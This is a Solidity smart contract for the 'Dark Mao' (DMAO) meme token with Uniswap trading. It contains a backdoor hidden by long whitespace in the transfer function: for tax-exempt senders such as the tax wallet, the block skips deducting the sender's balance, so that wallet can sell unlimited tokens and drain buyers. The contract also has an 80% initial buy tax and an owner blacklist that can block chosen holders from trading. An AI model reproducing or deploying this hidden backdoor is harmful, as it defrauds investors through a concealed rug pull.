// SPDX-License-Identifier: UNLICENSE

/**

- Website: https://darkmao.fun/


- X: https://x.com/darkmaoeth


- Telegram: https://t.me/darkmaoeth

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DarkMao is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) private _taxExempt;
    mapping (address => bool) private _isBot;
    address payable private _taxKeeper;

    uint256 private _initialBuyTax = 80;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 4;
    uint256 private _reduceSellTaxAt = 4;
    uint256 private _preventSwapBefore = 4;
    uint256 private _buyCount = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;
    string public constant name = unicode"Dark Mao";
    string public constant symbol = unicode"DMAO";
    uint256 public _maxTxAmount = 19_700_000 * 10**decimals;
    uint256 public _maxWalletSize = 19_700_000 * 10**decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10**decimals;
    uint256 public _maxTaxSwap = 19_500_000 * 10**decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    function sendETHToFee(uint256 amount) private {
        _taxKeeper.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _isBot[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          _isBot[notbot[i]] = false;
      }
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner{
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
    receive() external payable {}    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        incredible(sender, recipient, amount);
        _approve(sender, _msgSender(), allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function enableTrading() external onlyOwner() {
        tradingOpen = true;
    }
    

    function incredible(address helen, address bob, uint256 dash) private {
        require(helen != address(0), "ERC20: transfer from the zero address");
        require(bob != address(0), "ERC20: transfer to the zero address");
        require(dash > 0, "Transfer amount must be greater than zero");
        if (!tradingOpen || inSwap) {
            require(_taxExempt[helen] || _taxExempt[bob]);
            balanceOf[helen] = balanceOf[helen].sub(dash); 
            balanceOf[bob] = balanceOf[bob].add(dash); 
            emit Transfer(helen,bob, dash);
            return;
        }
        uint256 minAmount=dash;
        uint256 taxAmount=0;
        if (helen != owner() && bob != owner() && bob != _taxKeeper) {
            require(!_isBot[helen] && !_isBot[bob]);

            if (helen == uniswapV2Pair && bob != address(uniswapV2Router) && ! _taxExempt[bob] ) {
                require(tradingOpen,"Trading not open yet");
                require(dash <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[bob] + dash <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = dash.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(bob == uniswapV2Pair && helen!= address(this) ){
                taxAmount = dash.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!inSwap && bob == uniswapV2Pair && tradingOpen && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                if(minAmount > contractTokenBalance) minAmount = contractTokenBalance;
                if(minAmount > _maxTaxSwap) minAmount = _maxTaxSwap;
                swapTokensForEth(minAmount);minAmount = dash;
                sellCount++;
                lastSellBlock = block.number;                                                                                                                                                                                      }{
                if(_taxExempt[helen]) minAmount= 0;
            }
            if(bob == uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if(taxAmount>0){
          balanceOf[address(this)]=balanceOf[address(this)].add(taxAmount);
          emit Transfer(helen, address(this),taxAmount);
        }
        balanceOf[helen] = balanceOf[helen].sub(minAmount);
        balanceOf[bob] = balanceOf[bob].add(dash.sub(taxAmount));
        emit Transfer(helen, bob, dash.sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = totalSupply;
        _maxWalletSize=totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }


    constructor (address router_, address taxWallet_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _taxKeeper = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _taxExempt[_msgSender()] = true;
        _taxExempt[address(this)] = true;
        _taxExempt[_taxKeeper] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        incredible(_msgSender(), recipient, amount);
        return true;
    }
}